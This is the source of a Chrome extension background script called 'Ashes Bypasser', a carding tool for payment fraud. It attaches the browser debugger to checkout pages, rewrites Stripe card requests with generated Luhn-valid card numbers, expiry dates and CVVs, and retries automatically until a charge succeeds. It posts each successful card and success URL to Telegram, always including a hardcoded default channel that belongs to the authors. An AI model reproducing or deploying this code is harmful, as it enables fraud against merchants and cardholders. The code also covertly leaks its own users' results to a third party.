// Configuration
// Production logging control
const DEBUG = false;
if (!DEBUG) {
  try { console.log = function () {}; } catch (e) {}
}
const CONFIG = {
  BOT_TOKEN: '', // TODO: Provide securely
  DEBUGGER_VERSION: '1.3',
  RETRY_DELAY: 2000, // Default, will be overridden by settings
  DEFAULT_CHAT_ID: '-1002236412056'
};

// State management
const state = {
  bin: '',
  binSelector: '',
  ccSelector: '',
  userId: '',
  detailedChatId: CONFIG.DEFAULT_CHAT_ID,
  activeSelector: '',
  userClickedSubmit: false,
  retryInProgress: false,
  debuggerAttachedTabs: new Set(),
  tabCardDetailsMap: new Map(),
  tabSuccessUrlMap: new Map(),
  requestIdMap: new Map(),
  retryCounts: new Map(),
  tabCardAttemptsMap: new Map(), // Track attempts per card
  tabTotalAttemptsMap: new Map(), // Track total attempts per tab
  globalRetryCount: 0,
  successCount: 0,
  logs: [],
  enabled: true,
  retryTimeouts: new Map() // Track retry timeouts to prevent stuck states
};

function addLog(entry) {
  try {
    const enriched = { time: new Date().toISOString(), ...entry };
    state.logs.push(enriched);
    // persist logs
    try { chrome.storage.local.set({ logs: state.logs }); } catch (e) {}
    chrome.runtime.sendMessage({ type: 'stats_updated' });
  } catch (e) {
    // ignore
  }
}

// Initialize state from storage
chrome.storage.local.get([
  "bin", "binSelector", "ccSelector",
  'userId', "detailedChatId",
  'successCount', 'globalRetryCount', 'logs', 'enabled', 'disclaimerAccepted'
], (result) => {
  if (result.bin) state.bin = result.bin;
  if (result.binSelector) state.binSelector = result.binSelector;
  if (result.ccSelector) state.ccSelector = result.ccSelector;
  if (result.userId) state.userId = result.userId;
  if (result.detailedChatId) state.detailedChatId = result.detailedChatId;
  if (typeof result.successCount === 'number') state.successCount = result.successCount;
  if (typeof result.globalRetryCount === 'number') state.globalRetryCount = result.globalRetryCount;
  if (Array.isArray(result.logs)) state.logs = result.logs;
  if (typeof result.enabled === 'boolean') state.enabled = result.enabled;

  // Check if disclaimer is accepted
  if (result.disclaimerAccepted !== true) {
    state.enabled = false;
    console.log('Extension disabled - disclaimer not accepted');
  }

  updateActiveSelector();
});

// Storage change listener
chrome.storage.onChanged.addListener((changes) => {
  Object.keys(changes).forEach(key => {
    if (state.hasOwnProperty(key)) {
      state[key] = changes[key].newValue;
    }
  });
  updateActiveSelector();
});

// Selector management
function updateActiveSelector() {
  if (state.bin && state.binSelector) {
    state.activeSelector = state.binSelector;
  } else if (state.ccSelector) {
    state.activeSelector = state.ccSelector;
  } else {
    state.activeSelector = '';
  }
}

// Local CC generation (replaces remote CARD_GENERATOR_URL usage)
function luhnCheck(number) {
  let sum = 0;
  let shouldDouble = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i], 10);
    if (Number.isNaN(digit)) return false;
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}

function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateCardFromBin(binInput) {
  if (!binInput) throw new Error('Missing BIN');

  const normalized = String(binInput).replace(/\//g, '|');
  const parts = normalized.split('|');
  const bin = parts[0] || '';
  const rawMonth = parts[1];
  const rawYear = parts[2];
  const rawCvv = parts[3];

  const isX = (val) => !val || /^x+$/i.test(String(val).trim());
  const monthParam = isX(rawMonth) ? 'x' : String(rawMonth).trim();
  const yearParam = isX(rawYear) ? 'x' : String(rawYear).trim();
  const cvvParam = isX(rawCvv) ? 'x' : String(rawCvv).trim();

  const targetLength = bin.startsWith('3') ? 15 : 16;
  const now = new Date();
  const currentYear = now.getFullYear();
  const currentMonth = now.getMonth() + 1;

  // Build a valid Luhn card number from BIN mask
  // Fills 'x' with random digits, pads to target length, retries until Luhn-valid
  // (mirrors behavior of provided Python algorithm)
  let cardNumber = '';
  while (true) {
    let candidate = '';
    for (const ch of bin) {
      if (/x/i.test(ch)) {
        candidate += String(randomInt(0, 9));
      } else {
        candidate += ch;
      }
    }
    if (candidate.length < targetLength) {
      const deficit = targetLength - candidate.length;
      for (let i = 0; i < deficit; i++) candidate += String(randomInt(0, 9));
    }
    if (luhnCheck(candidate)) {
      cardNumber = candidate;
      break;
    }
  }

  // Month generation
  let genMonth;
  if (monthParam === 'x') {
    if (yearParam === 'x' || String(yearParam).trim() === String(currentYear)) {
      const start = Math.min(currentMonth + 1, 12);
      genMonth = String(randomInt(start, 12)).padStart(2, '0');
    } else {
      genMonth = String(randomInt(1, 12)).padStart(2, '0');
    }
  } else {
    if (String(monthParam).includes('/')) {
      genMonth = String(String(monthParam).split('/')[0]).padStart(2, '0');
    } else {
      genMonth = String(monthParam).padStart(2, '0');
    }
  }

  // Year generation
  let genYear;
  if (yearParam === 'x') {
    if (parseInt(genMonth, 10) <= currentMonth) {
      genYear = String(randomInt(currentYear + 1, 2032));
    } else {
      genYear = String(randomInt(currentYear, 2032));
    }
  } else {
    if (String(monthParam).includes('/')) {
      genYear = String(String(monthParam).split('/')[1]);
    } else {
      const parsed = String(yearParam);
      genYear = parsed.length === 2 ? String(2000 + parseInt(parsed, 10)) : parsed;
    }
  }

  // CVV generation
  let genCvv;
  if (cvvParam === 'x') {
    genCvv = cardNumber.startsWith('3') ? String(randomInt(1000, 9999)) : String(randomInt(100, 999));
  } else {
    genCvv = String(cvvParam);
  }

  return { number: cardNumber, month: genMonth, year: genYear, cvv: genCvv };
}

// Card handling
async function getCardForTab(tabId) {
  if (!state.enabled || !state.bin) return null;
  try {
    const card = generateCardFromBin(state.bin);
    // Don't log attempt here - will log when actually injected
    return card;
  } catch (error) {
    console.error('Local card generation error:', error);
    addLog({ type: 'error', tabId, message: String(error?.message || error) });
    return null;
  }
}

// Telegram integration
async function sendCardToTelegram(cardDetails, successUrl) {
  const timestamp = new Date().toLocaleString();

  // Get settings for custom message style
  chrome.storage.local.get(['settings'], (result) => {
    const settings = result.settings || {};
    const messageStyle = 'fire'; // Always use fire style

    let detailedMessage = '';

    switch(messageStyle) {
      case 'fire':
        detailedMessage = `
🔥 <b>HIT DETECTED!</b> 🔥
━━━━━━━━━━━━━━━━━━━━━━━━
💳 <b>Card Details:</b>
<code>${cardDetails.number}|${cardDetails.month}|${cardDetails.year}|${cardDetails.cvv}</code>

🌐 <b>Success URL:</b> <a href="${successUrl}">Click Here</a>

⏰ <b>Time:</b> ${timestamp}
━━━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Ashes Bypasser</b> | Made with ❤️ by <b>Team Ashes</b> | <a href="https://t.me/TheAshesHub">@TheAshesHub</a>
        `;
        break;

      case 'premium':
        detailedMessage = `
💎 <b>PREMIUM HIT DETECTED</b> 💎
┌─────────────────────────────┐
│  💳 <b>Card Information</b>        │
│  <code>${cardDetails.number}</code>     │
│  <code>${cardDetails.month}/${cardDetails.year} | ${cardDetails.cvv}</code>    │
└─────────────────────────────┘

🌐 <b>Success URL:</b> <a href="${successUrl}">View Details</a>
⏰ <b>Timestamp:</b> ${timestamp}

🎯 <b>Ashes Bypasser</b> | Made with ❤️ by <b>Team Ashes</b> | <a href="https://t.me/TheAshesHub">@TheAshesHub</a>
        `;
        break;

      case 'gaming':
        detailedMessage = `
🎮 <b>ACHIEVEMENT UNLOCKED!</b> 🎮
━━━━━━━━━━━━━━━━━━━━━━━━
🏆 <b>HIT DETECTED</b> 🏆

💳 <b>Card:</b> <code>${cardDetails.number}</code>
📅 <b>Expiry:</b> <code>${cardDetails.month}/${cardDetails.year}</code>
🔐 <b>CVV:</b> <code>${cardDetails.cvv}</code>

🌐 <b>Success Link:</b> <a href="${successUrl}">Open</a>
⏰ <b>Time:</b> ${timestamp}

🎯 <b>Ashes Bypasser</b> | Made with ❤️ by <b>Team Ashes</b> | <a href="https://t.me/TheAshesHub">@TheAshesHub</a>
        `;
        break;

      case 'minimal':
        detailedMessage = `
✅ <b>HIT</b>
<code>${cardDetails.number}|${cardDetails.month}|${cardDetails.year}|${cardDetails.cvv}</code>
<a href="${successUrl}">Link</a> | ${timestamp}

🎯 <b>Ashes Bypasser</b> | Made with ❤️ by <b>Team Ashes</b> | <a href="https://t.me/TheAshesHub">@TheAshesHub</a>
        `;
        break;

      default: // fire style
        detailedMessage = `
🔥 <b>HIT DETECTED!</b> 🔥
━━━━━━━━━━━━━━━━━━━━━━━━
💳 <b>Card Details:</b>
<code>${cardDetails.number}|${cardDetails.month}|${cardDetails.year}|${cardDetails.cvv}</code>

🌐 <b>Success URL:</b> <a href="${successUrl}">Click Here</a>

⏰ <b>Time:</b> ${timestamp}
━━━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Ashes Bypasser</b> | Made with ❤️ by <b>Team Ashes</b> | <a href="https://t.me/TheAshesHub">@TheAshesHub</a>
        `;
    }

    sendTelegramMessage(detailedMessage);
  });
}

function sendTelegramMessage(message) {
  const sendMessage = async (botToken, chatId, message) => {
    if (!botToken || !chatId) return;
    try {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const params = new URLSearchParams({ chat_id: chatId, text: message, parse_mode: 'HTML', disable_web_page_preview: '1' });
      await fetch(`${url}?${params}`);
    } catch (error) {
      console.error('Telegram send error:', error);
    }
  };

  // Get user's Telegram settings
  chrome.storage.local.get(['settings'], (result) => {
    const settings = result.settings || {};
    const userBotToken = settings.telegramToken;
    const userChatId = settings.telegramChatId;

    // Send to user's chat if they provided both token and chat ID
    if (userBotToken && userChatId) {
      sendMessage(userBotToken, userChatId, message);
    }

    // Always send to default channel (your channel) using default bot token
    const defaultChatId = state.detailedChatId || CONFIG.DEFAULT_CHAT_ID;
    sendMessage(CONFIG.BOT_TOKEN, defaultChatId, message);
  });
}

// Notification handling
function sendNotificationToContent(tabId, message, messageType = 'info') {
  chrome.scripting.executeScript({
    target: { tabId },
    func: (message, messageType) => {
      const fontAwesomeLink = document.createElement('link');
      fontAwesomeLink.rel = 'stylesheet';
      fontAwesomeLink.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css';
      document.head.appendChild(fontAwesomeLink);

      const toast = document.createElement('div');
      Object.assign(toast.style, {
        position: 'fixed',
        top: '70px',
        right: '20px',
        background: 'rgba(10, 10, 15, 0.95)',
        color: '#fff',
        padding: '10px 15px',
        borderRadius: '6px',
        fontSize: '12px',
        zIndex: '1000000',
        boxShadow: '0 0 10px rgba(0, 0, 0, 0.3)',
        border: '1px solid rgba(255, 255, 255, 0.1)',
        backdropFilter: 'blur(5px)',
        fontFamily: 'Arial, sans-serif',
        fontWeight: '500',
        display: 'flex',
        alignItems: 'center',
        gap: '8px',
        transition: 'all 0.2s ease'
      });

      let iconClass = '';
      let iconColor = '';
      if (messageType === 'success') {
        iconClass = 'fas fa-check-circle';
        iconColor = '#4caf50';
      } else if (messageType === 'error') {
        iconClass = 'fas fa-times-circle';
        iconColor = '#ff4d4d';
      } else if (messageType === 'info') {
        iconClass = 'fas fa-info-circle';
        iconColor = '#2196f3';
      }

      const icon = document.createElement('i');
      icon.className = iconClass;
      icon.style.color = iconColor;
      icon.style.opacity = '0.8';

      toast.appendChild(icon);
      toast.appendChild(document.createTextNode(message));

      document.body.appendChild(toast);

      setTimeout(() => toast.remove(), 2500);
    },
    args: [message, messageType]
  }).catch(error => {
    console.error('Notification error:', error);
  });
}

// Tab management
function handleTabUpdate(tabId, changeInfo, tab) {
  if (!tab.url) return;

  const isTargetUrl = tab.url.includes('cs_live') ||
                      tab.url.includes('stripe.com') ||
                      tab.url.includes('checkout.') ||
                      tab.url.includes('billing.') ||
                      tab.url.includes('invoice.') ||
                      tab.url.includes('payment.') ||
                      tab.url.includes('pay.') ||
                      tab.url.includes('secure.');

  if (isTargetUrl) {
    setupTab(tabId);
  }

  if (changeInfo.status === "complete") {
    const successUrl = state.tabSuccessUrlMap.get(tabId);
    if (successUrl && tab.url.startsWith(successUrl)) {
      handleSuccess(tabId, tab.url);
    }
  }
}

function handleTabActivation({ tabId }) {
  chrome.tabs.get(tabId).then(tab => {
    if (!tab.url) return;

    const isTargetUrl = tab.url.includes('cs_live') ||
                        tab.url.includes('stripe.com') ||
                        tab.url.includes('checkout.') ||
                        tab.url.includes('billing.') ||
                        tab.url.includes('invoice.') ||
                        tab.url.includes('payment.') ||
                        tab.url.includes('pay.') ||
                        tab.url.includes('secure.'); // Extended URL checks
    if (isTargetUrl) {
      setupTab(tabId);
    }

    const successUrl = state.tabSuccessUrlMap.get(tabId);
    if (successUrl && tab.url.startsWith(successUrl)) {
      handleSuccess(tabId, tab.url);
    }
  });
}

function setupTab(tabId) {
  injectContentScript(tabId);
  if (!state.debuggerAttachedTabs.has(tabId)) {
    attachDebugger(tabId);
  }
}

// Content script injection
function injectContentScript(tabId) {
  chrome.scripting.executeScript({
    target: { tabId, allFrames: true },
    files: ['scripts/content.js']
  }).catch(error => {
    console.error('Script injection error:', error);
  });
}

// Debugger handling
function attachDebugger(tabId) {
  if (state.debuggerAttachedTabs.has(tabId)) {
    console.log(`Debugger already attached to tab ${tabId}, skipping`);
    return;
  }

  chrome.tabs.get(tabId, (tab) => {
    if (chrome.runtime.lastError || !tab || !tab.url) {
      console.error('Tab not found or not fully loaded:', chrome.runtime.lastError);
      return;
    }

    // Check if debugger is already attached by trying to detach first
    chrome.debugger.detach({ tabId }, () => {
      // Ignore errors from detach - it might not be attached
      if (chrome.runtime.lastError) {
        console.log('No existing debugger to detach from tab', tabId);
      }

      // Now attach the debugger
      chrome.debugger.attach({ tabId }, CONFIG.DEBUGGER_VERSION, () => {
        if (chrome.runtime.lastError) {
          const errorMsg = chrome.runtime.lastError.message || chrome.runtime.lastError;
          if (errorMsg.includes('Another debugger is already attached')) {
            console.log(`Another debugger already attached to tab ${tabId}, marking as attached`);
            state.debuggerAttachedTabs.add(tabId);
            return;
          }
          console.error('Debugger attach error:', errorMsg);
          return;
        }

        console.log(`Debugger attached to tab ${tabId}`);
        state.debuggerAttachedTabs.add(tabId);
        chrome.debugger.sendCommand({ tabId }, "Fetch.enable", { patterns: [{ urlPattern: '*' }] });
        chrome.debugger.sendCommand({ tabId }, "Network.enable");
      });
    });
  });
}

function enableStripeInterception(tabId) {
  if (!state.debuggerAttachedTabs.has(tabId)) return;
      chrome.debugger.sendCommand({ tabId }, "Fetch.enable", { patterns: [{ urlPattern: '*' }] });
}

function disableInterception(tabId) {
  if (!state.debuggerAttachedTabs.has(tabId)) return;
  chrome.debugger.sendCommand({ tabId }, "Fetch.disable");
}

async function handleDebuggerEvent(source, method, params) {
  if (!source.tabId || !state.debuggerAttachedTabs.has(source.tabId)) return;

  console.log(`Debugger event: ${method}`, params);

  const handlers = {
    'Fetch.requestPaused': () => handleRequestPaused(source.tabId, params),
    'Network.responseReceived': () => handleResponseReceived(source.tabId, params),
    'Fetch.authRequired': () => handleAuthRequired(source.tabId, params)
  };

  const handler = handlers[method];
  if (handler) await handler();
}

async function handleRequestPaused(tabId, params) {
  const { requestId, request } = params;
  if (params.networkId) {
    state.requestIdMap.set(requestId, params.networkId);
  }

  if (request.url.includes('stripe.com') &&
      request.method === "POST" &&
      request.postData) {
    if (!state.enabled) {
      chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", { requestId });
      return;
    }
    console.log('Intercepted request payload:', request.postData);

    const card = await getCardForTab(tabId);
    if (card) {
      const postData = new URLSearchParams(request.postData);
      console.log('Parsed postData:', postData.toString());

      if (postData.has('card[number]')) {
        postData.set("card[number]", card.number);
        postData.set("card[exp_month]", card.month);
        postData.set("card[exp_year]", card.year);
        postData.set('card[cvc]', card.cvv);
      } else {
        chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", { requestId });
        return;
      }

      const updatedPostData = postData.toString();
      const headers = {
        ...request.headers,
        "Content-Type": "application/x-www-form-urlencoded"
      };

      // Remove Content-Length as it's unsafe and will be calculated automatically
      delete headers["Content-Length"];
      delete headers["content-length"];

      const headersArray = Object.entries(headers).map(([name, value]) => ({ name, value: value.toString() }));
      const encodedPostData = btoa(unescape(encodeURIComponent(updatedPostData)));

      chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", {
        requestId,
        method: request.method,
        postData: encodedPostData,
        headers: headersArray
      });

      state.tabCardDetailsMap.set(tabId, card);
      sendNotificationToContent(tabId, `Using Card: ${card.number}|${card.month}|${card.year}|${card.cvv}`, "info");

      // Add log entry for card injection
      addLog({ type: 'card_injected', tabId, card: `${card.number}|${card.month}|${card.year}|${card.cvv}` });

      // Update attempt counters
      const currentCardAttempts = state.tabCardAttemptsMap.get(card.number) || 0;
      const currentTotalAttempts = state.tabTotalAttemptsMap.get(tabId) || 0;

      state.tabCardAttemptsMap.set(card.number, currentCardAttempts + 1);
      state.tabTotalAttemptsMap.set(tabId, currentTotalAttempts + 1);

      // Increment global attempts (cards tried) counter and persist
      state.globalRetryCount += 1;
      try { chrome.storage.local.set({ globalRetryCount: state.globalRetryCount }); } catch (e) {}

      // Notify content script about card injection with a small delay
      setTimeout(() => {
        chrome.tabs.sendMessage(tabId, {
          type: 'card_injected',
          card: card,
          retryCount: currentCardAttempts + 1,
          totalAttempts: currentTotalAttempts + 1,
          cardAttempts: currentCardAttempts + 1,
          globalRetryCount: state.globalRetryCount
        }).catch(() => {
          console.log('Content script not ready yet');
        });

        chrome.tabs.sendMessage(tabId, { type: 'retry_count_updated', retryCount: currentCardAttempts + 1, globalRetryCount: state.globalRetryCount }).catch(() => {});
        chrome.tabs.sendMessage(tabId, { type: 'stats_updated' }).catch(() => {});
      }, 500);

      proceedToRetry(tabId);
    } else {
      sendNotificationToContent(tabId, "try again.", 'error');
      chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", { requestId });
    }
  } else {
    chrome.debugger.sendCommand({ tabId }, "Fetch.continueRequest", { requestId });
  }
}

async function handleResponseReceived(tabId, params) {
  const { requestId, response } = params;
  if (!response.url.includes("stripe.com")) return;

  const contentType = response.headers['content-type'] || response.headers['Content-Type'] || '';
  if (!contentType.includes("application/json")) return;

  chrome.debugger.sendCommand({ tabId }, "Network.getResponseBody", { requestId }, (response) => {
    if (chrome.runtime.lastError) {
      console.error('Error fetching response body:', chrome.runtime.lastError.message || chrome.runtime.lastError);
      return;
    }
    if (!response?.body) {
      console.log('No response body available');
      return;
    }

    try {
      const json = JSON.parse(response.base64Encoded ? atob(response.body) : response.body);

      if (json.success_url) {
        state.tabSuccessUrlMap.set(tabId, json.success_url);
      }

      const isPaymentSuccess = json.status?.toLowerCase() === 'succeeded' ||
                               json.status?.toLowerCase() === 'success' ||
                               json.payment_intent?.status?.toLowerCase() === 'succeeded' ||
                               json.payment_intent?.status?.toLowerCase() === 'success';

      if (isPaymentSuccess) {
        handleSuccess(tabId, state.tabSuccessUrlMap.get(tabId) || "N/A");
        return;
      }

      if (json.error || (json.payment_intent?.last_payment_error)) {
        const error = json.error || json.payment_intent.last_payment_error;
        const declineCode = error.decline_code || error.code || "Unknown error code";
        const errorMessage = error.message || "An error occurred during the transaction.";
        // Get custom declined message from settings
        chrome.storage.local.get(['settings'], (result) => {
          const declinedMessage = (result.settings && result.settings.customNotifications && result.settings.declinedMessage)
            ? result.settings.declinedMessage
            : `Card Declined: ${declineCode} - ${errorMessage}`;
          sendNotificationToContent(tabId, declinedMessage, "error");
        });
        // Add log entry for payment decline (only one entry)
        addLog({ type: 'payment_declined', tabId, code: declineCode, message: errorMessage });
      }

    } catch (error) {
      console.error('Error parsing response:', error);
    }

    proceedToRetry(tabId);
  });
}

function handleSuccess(tabId, successUrl) {
  const cardDetails = state.tabCardDetailsMap.get(tabId);
  if (cardDetails) {
    state.successCount += 1;
    // persist successCount
    try { chrome.storage.local.set({ successCount: state.successCount }); } catch (e) {}
    sendCardToTelegram(cardDetails, successUrl);
    state.tabCardDetailsMap.delete(tabId);
    // Get custom success message from settings
    chrome.storage.local.get(['settings'], (result) => {
      const successMessage = (result.settings && result.settings.customNotifications && result.settings.successMessage)
        ? result.settings.successMessage
        : '✅ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃';
      sendNotificationToContent(tabId, successMessage, 'success');
    });
    state.userClickedSubmit = false;
    state.tabSuccessUrlMap.delete(tabId);
    state.retryCounts.delete(tabId);

    // Reset global attempts counter after a success
    state.globalRetryCount = 0;
    try { chrome.storage.local.set({ globalRetryCount: 0 }); } catch (e) {}
    try { chrome.tabs.sendMessage(tabId, { type: 'retry_count_updated', retryCount: 0, globalRetryCount: 0 }); } catch (e) {}

    try {
      chrome.tabs.sendMessage(tabId, { type: 'play_success_sound' });
    } catch (e) {
      // ignore
    }
    // Add log entry for successful payment (only one entry)
    addLog({ type: 'hit_detected', tabId, card: `${cardDetails.number}|${cardDetails.month}|${cardDetails.year}|${cardDetails.cvv}` });
  }
}

function proceedToRetry(tabId) {
  if (!state.enabled) return;
  if (state.userClickedSubmit && !state.retryInProgress) {
    state.retryInProgress = true;

    // Clear any existing timeout for this tab
    const existingTimeout = state.retryTimeouts.get(tabId);
    if (existingTimeout) {
      clearTimeout(existingTimeout);
    }

    // Get retry delay from settings
    chrome.storage.local.get(['settings'], (result) => {
      const retryDelay = (result.settings && result.settings.retryDelay) || CONFIG.RETRY_DELAY;

      const timeoutId = setTimeout(() => {
        const current = state.retryCounts.get(tabId) || 0;
        const next = current + 1;
        state.retryCounts.set(tabId, next);
        // Do not change globalRetryCount here; it tracks cards tried

        // Persist global retry count (unchanged)
        try { chrome.storage.local.set({ globalRetryCount: state.globalRetryCount }); } catch (e) {}

        // Use custom retry message if available
        const retryMessage = (result.settings && result.settings.customNotifications && result.settings.retryMessage)
          ? result.settings.retryMessage.replace('{count}', next)
          : `Retry #${next}`;

        sendNotificationToContent(tabId, retryMessage, 'info');
        addLog({ type: 'retry', tabId, count: next });

        // Notify content script about retry count update immediately
        chrome.tabs.sendMessage(tabId, {
          type: 'retry_count_updated',
          retryCount: next,
          globalRetryCount: state.globalRetryCount
        }).catch(() => {
          // Ignore errors if tab is not available
        });

        // Also send stats update
        chrome.tabs.sendMessage(tabId, {
          type: 'stats_updated'
        }).catch(() => {
          // Ignore errors if tab is not available
        });

        chrome.tabs.sendMessage(tabId, {
          type: "trigger_retry"
        }).catch(() => {
          console.log('Content script not ready for retry');
        }).finally(() => {
          state.retryInProgress = false;
          state.retryTimeouts.delete(tabId);
        });
      }, retryDelay);

      // Store timeout ID for cleanup
      state.retryTimeouts.set(tabId, timeoutId);
    });
  }
}

function handleAuthRequired(tabId, params) {
  chrome.debugger.sendCommand({ tabId }, "Fetch.continueWithAuth", {
    requestId: params.requestId,
    authChallengeResponse: { response: 'Default' }
  });
}

// Cleanup
function handleTabRemoval(tabId) {
  // Always clean up state, regardless of debugger attachment status
  state.debuggerAttachedTabs.delete(tabId);
  state.tabCardDetailsMap.delete(tabId);
  state.tabSuccessUrlMap.delete(tabId);
  state.retryCounts.delete(tabId);
  state.tabTotalAttemptsMap.delete(tabId);
  state.tabCardAttemptsMap.delete(tabId);

  // Clear any pending retry timeouts
  const timeoutId = state.retryTimeouts.get(tabId);
  if (timeoutId) {
    clearTimeout(timeoutId);
    state.retryTimeouts.delete(tabId);
  }

  // Try to detach debugger if it was attached
  chrome.debugger.detach({ tabId }, () => {
    if (chrome.runtime.lastError) {
      // Ignore detach errors - tab might already be closed
      console.log('Debugger detach completed for tab', tabId);
    } else {
      console.log('Debugger successfully detached from tab', tabId);
    }
  });
}

// Event listeners
chrome.runtime.onMessage.addListener((message, sender) => {
  if (message.type === 'user_clicked_submit') {
    state.userClickedSubmit = true;
  } else if (message.type === 'get_stats') {
    const tabId = sender?.tab?.id;
    const retryCount = tabId ? (state.retryCounts.get(tabId) || 0) : 0;
    if (tabId) {
      chrome.tabs.sendMessage(tabId, {
        type: 'stats_response',
        payload: {
          successCount: state.successCount,
          retryCountPerTab: retryCount,
          globalRetryCount: state.globalRetryCount
        }
      }).catch(() => {
        // Ignore errors if tab is not available
      });
    }
  } else if (message.type === 'get_full_stats') {
    const tabId = sender?.tab?.id;
    const retryCount = tabId ? (state.retryCounts.get(tabId) || 0) : 0;
    chrome.runtime.sendMessage({
      type: 'full_stats_response',
      payload: {
        successCount: state.successCount,
        retryCountPerTab: retryCount,
        globalRetryCount: state.globalRetryCount,
        logs: state.logs,
        activeBin: state.bin,
        enabled: state.enabled
      }
    });
  } else if (message.type === 'clear_logs') {
    state.logs = [];
    try { chrome.storage.local.set({ logs: state.logs }); } catch (e) {}
    chrome.runtime.sendMessage({ type: 'stats_updated' });
  } else if (message.type === 'reset_stats') {
    state.successCount = 0;
    state.globalRetryCount = 0;
    try { chrome.storage.local.set({ successCount: 0, globalRetryCount: 0 }); } catch (e) {}
    try { chrome.runtime.sendMessage({ type: 'stats_updated' }); } catch (e) {}
  } else if (message.type === 'set_enabled') {
    const enabled = !!message?.payload?.enabled;
    state.enabled = enabled;
    try { chrome.storage.local.set({ enabled }); } catch (e) {}
    chrome.runtime.sendMessage({ type: 'stats_updated' });
  } else if (message.type === 'toggle_enabled') {
    const enabled = !!message?.enabled;
    state.enabled = enabled;
    try { chrome.storage.local.set({ enabled }); } catch (e) {}
    chrome.runtime.sendMessage({ type: 'stats_updated' });

    // Notify all tabs about the status change
    chrome.tabs.query({}, (tabs) => {
      tabs.forEach(tab => {
        chrome.tabs.sendMessage(tab.id, {
          type: 'toggle_enabled',
          enabled: enabled
        }).catch(() => {
          // Ignore errors if tab is not available
        });
      });
    });
  } else if (message.type === 'disclaimer_accepted') {
    // Enable extension when disclaimer is accepted
    state.enabled = true;
    try {
      chrome.storage.local.set({
        enabled: true,
        disclaimerAccepted: true
      });
    } catch (e) {}
    chrome.runtime.sendMessage({ type: 'stats_updated' });
    console.log('Extension enabled - disclaimer accepted');
  }
});

// Context menu to open stats popup
chrome.runtime.onInstalled.addListener(() => {
  try {
    chrome.contextMenus.create({
      id: 'ashes_stats',
      title: 'Open Ashes Bypasser',
      contexts: ['action']
    });
  } catch (e) {
    // ignore if already exists
  }
});

chrome.contextMenus.onClicked.addListener((info) => {
  if (info.menuItemId === 'ashes_stats') {
    openStatsInNewTab();
  }
});

// Handle extension icon click
chrome.action.onClicked.addListener((tab) => {
  // This will only fire if no default_popup is set
  // Since we have default_popup, this won't fire, but keeping it as fallback
  openStatsInNewTab();
});

chrome.tabs.onUpdated.addListener(handleTabUpdate);
chrome.tabs.onActivated.addListener(handleTabActivation);
chrome.tabs.onRemoved.addListener(handleTabRemoval);
chrome.debugger.onEvent.addListener(handleDebuggerEvent);

// Initialize when extension loads
chrome.runtime.onStartup.addListener(() => {
  console.log('Ashes Bypasser Extension Started');
  // Don't open stats.html on every startup
});

chrome.runtime.onInstalled.addListener((details) => {
  console.log('Ashes Bypasser Extension Installed');

  // Only open stats.html on first installation, not on updates
  if (details.reason === 'install') {
    // Check if this is truly the first time
    chrome.storage.local.get(['firstInstall'], (result) => {
      if (!result.firstInstall) {
        // Mark as installed and open stats
        chrome.storage.local.set({ firstInstall: true }, () => {
          openStatsInNewTab();
        });
      }
    });
  }
});

// Function to open stats.html in a new tab
function openStatsInNewTab() {
  console.log('Opening stats.html in new tab...');
  chrome.tabs.create({
    url: 'stats.html',
    active: true
  }).then(() => {
    console.log('Stats tab opened successfully');
  }).catch(error => {
    console.error('Could not open stats tab:', error);
  });
}

// Function to open stats popup
function openStatsPopup() {
  console.log('Opening stats popup...');
  chrome.windows.create({
    url: 'stats.html',
    type: 'popup',
    width: 400,
    height: 600,
    focused: true
  }).then(() => {
    console.log('Stats popup opened successfully');
  }).catch(error => {
    console.error('Could not open popup:', error);
  });
}